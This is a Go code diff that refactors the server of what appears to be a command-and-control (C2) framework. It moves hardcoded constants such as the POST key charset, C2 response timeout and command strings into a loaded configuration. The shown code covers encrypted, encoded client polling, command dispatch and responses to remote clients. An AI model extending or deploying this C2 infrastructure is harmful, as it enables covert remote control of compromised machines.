@@ -77,9 +77,11 @@ type NetInstance struct {
     RequestURI              string
 }
 
-var (
-    channelService          *NetChannelService
-)
+/*
+ * The main object representing the service functionality
+ */
+var channelService          *NetChannelService
+
 func CreateServer(pathGate string, port int16, flags FlagVal, handler func(client *NetInstance,
     server *NetChannelService) error) (*NetChannelService, error) {
 
@@ -88,7 +90,11 @@ func CreateServer(pathGate string, port int16, flags FlagVal, handler func(clien
         return nil, util.RetErrStr("FLAG_ENCRYPT must be set")
     }
 
-    if testCharSetPKE(POST_BODY_KEY_CHARSET) == false {
+    if err := ParseConfig(); err != nil {
+        return nil, err
+    }
+
+    if testCharSetPKE(masterConfig.PostBodyKeyCharset) == false {
         return nil, util.RetErrStr("PANIC: POST_BODY_KEY_CHARSET contains non-unique elements")
     }
 
@@ -347,7 +353,7 @@ func parseExistingClient(reader *http.Request, writer *http.ResponseWriter) {
             var (
                 clientId       string
                 data           []byte = nil
-                txUnit         *TransferUnit = nil
+                txUnit         *transferUnit = nil
             )
             if clientId, data, txUnit, err = decryptData(value[0], client.secret);
                 err != nil || strings.Compare(clientId, client.ClientIdString) != 0 {
@@ -380,11 +386,10 @@ func decodePublicKeyParameters(reader *http.Request) (clientKey *string, err err
         util.DebugOut(err.Error())
         return nil, err
     }
-    const cs = POST_BODY_KEY_CHARSET
     clientKey = nil
     for key := range reader.Form {
-        for i := len(POST_BODY_KEY_CHARSET); i != 0; i -= 1 {
-            var tmpKey = string(cs[i - 1])
+        for i := len(masterConfig.PostBodyKeyCharset); i != 0; i -= 1 {
+            var tmpKey = string(masterConfig.PostBodyKeyCharset[i - 1])
 
             decodedKey, err := util.B64D(key)
             if err != nil {
@@ -411,12 +416,12 @@ func (f *NetInstance) parseClientData(rawData []byte, writer http.ResponseWriter
         var command = string(rawData)
 
         switch command {
-        case CHECK_STREAM_DATA:
+        case masterConfig.CheckStream:
             if f.connected == false {
                 return util.RetErrStr("client not connected")
             }
 
-            var timeout = CONTROLLER_RESPONSE_TIMEOUT * 100
+            var timeout = masterConfig.C2ResponseTimeout * 100
             for ; timeout != 0; timeout -= 1 {
                 if f.clientTX.Len() != 0 {
                     break
@@ -452,11 +457,11 @@ func (f *NetInstance) parseClientData(rawData []byte, writer http.ResponseWriter
             encrypted, _ := encryptData(outputStream, f.secret, FLAG_DIRECTION_TO_CLIENT, otherFlags, f.ClientIdString)
             return sendResponse(writer, encrypted)
 
-        case TEST_CONNECTION_DATA:
+        case masterConfig.TestStream:
             encrypted, _ := encryptData(rawData, f.secret, FLAG_DIRECTION_TO_CLIENT, 0, f.ClientIdString)
             return sendResponse(writer, encrypted)
 
-        case TERMINATE_CONNECTION_DATA:
+        case masterConfig.TermConnect:
             /* FIXME */
             panic("terminating connection")
         }
@@ -545,7 +550,7 @@ func sendResponse(writer http.ResponseWriter, data []byte) error {
 
     var b64Encoded = util.B64E(data)
 
-    writer.Header().Set("Content-Type", HTTP_CONTENT_TYPE)
+    writer.Header().Set("Content-Type", masterConfig.ContentType)
     writer.Header().Set("Connection", "close")
     writer.WriteHeader(http.StatusOK)
 
